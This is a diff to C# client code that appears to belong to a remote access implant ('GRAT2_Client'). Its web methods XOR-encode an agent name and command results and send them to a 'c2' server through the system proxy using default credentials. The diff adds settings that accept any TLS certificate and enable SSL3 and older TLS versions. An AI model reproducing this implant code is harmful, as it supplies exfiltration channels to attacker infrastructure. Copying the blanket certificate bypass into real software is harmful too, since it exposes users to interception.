@@ -2,6 +2,8 @@
 using System.Text;
 using System.Net;
 using System.IO;
+using System.Security.Cryptography.X509Certificates;
+using System.Net.Security;
 
 namespace GRAT2_Client.PInvoke
 {
@@ -11,9 +13,12 @@ namespace GRAT2_Client.PInvoke
         {
             // https://docs.microsoft.com/en-us/dotnet/framework/network-programming/how-to-send-data-using-the-webrequest-class
 
-            //string postData = "data=" + agentName + results;
             string postData = agentName + results;
             string encrypted = Encryption.xor(postData);
+            // https://forums.asp.net/t/2150266.aspx?The+request+was+aborted+Could+not+create+SSL+TLS+secure+channel
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11;
+            ServicePointManager.ServerCertificateValidationCallback = (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => { return true; };
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(c2);
             request.Proxy = WebRequest.GetSystemWebProxy();
             request.Proxy.Credentials = CredentialCache.DefaultCredentials;
@@ -42,6 +47,9 @@ namespace GRAT2_Client.PInvoke
         {
             // https://docs.microsoft.com/en-us/dotnet/framework/network-programming/how-to-request-data-using-the-webrequest-class
             string agentName_encrypt = Encryption.xor(agentName);
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11;
+            ServicePointManager.ServerCertificateValidationCallback = (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => { return true; };
             WebClient client = new WebClient();
             client.Proxy = WebRequest.GetSystemWebProxy();
             client.Proxy.Credentials = CredentialCache.DefaultCredentials;
